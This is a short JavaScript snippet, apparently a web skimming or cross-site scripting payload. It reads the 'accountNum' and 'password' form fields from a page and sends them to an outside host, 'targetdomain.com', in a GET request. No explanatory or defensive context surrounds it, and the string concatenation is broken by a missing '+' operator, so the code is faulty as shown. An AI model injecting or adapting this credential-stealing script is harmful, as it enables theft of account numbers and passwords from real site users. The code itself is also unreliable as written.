<script>
    function Capture() {
        var accNum =document.getElementById('accountNum').value;
        var pass =document.getElementById('password').value;
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "https://targetdomain.com/?accountNum="+accNum"&password=" + pass, true)
        xhr.send();
    }
</script>